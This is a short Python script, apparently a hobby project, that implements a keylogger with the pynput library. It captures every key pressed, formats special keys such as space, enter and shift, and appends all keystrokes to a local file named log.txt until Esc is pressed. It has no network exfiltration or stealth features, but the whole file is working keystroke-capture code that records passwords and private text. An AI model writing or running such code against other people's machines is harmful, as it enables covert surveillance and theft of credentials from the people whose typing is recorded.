# the imports needed to track key logs
import pynput
from pynput.keyboard import Key, Listener, Controller

# caps the letters
upper = False

# runs when a key is pressed
def on_press(key):
  global upper
  keydata = str(key) # turns the key code into a string for use

  if keydata.find("Key") == -1: # checks if key press is a letter
    keydata = keydata[1:-1]
    keydata = keydata if upper else keydata.lower()
  # puts a space instead of Key.space
  if keydata == "Key.space":
    keydata = " "
  # replaces Key.enter with a new line
  elif keydata == "Key.enter":
    keydata = "\n"
  # sets the letters to caps while this is pressed
  elif keydata in ["Key.shift_r", "Key.shift_l", "Key.shift", "Key.caps_lock"]:
    keydata = " " + keydata + " "
    upper = True
  # instead of messy keycodes, this makes the log nicer to look at
  else:
    keydata = " " + keydata + " "
  # writes the keydata (the string of the keycodes) to the log
  with open("log.txt", "a") as f:
    f.write(keydata)
# runs when a key is released
def on_release(key):
  global upper
  keydata = str(key) # turns the key code into a string for use
  # returns letters into lowercase letters after one of these is released
  if keydata in ["Key.shift_r", "Key.shift_l", "Key.shift", "Key.caps_lock"]:
    upper = False
  # exits the code and stops monitoring the keys being pressed
  if key == Key.esc:
    return False
# joins all the keydata and activates the functions on_press and on_release
with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()

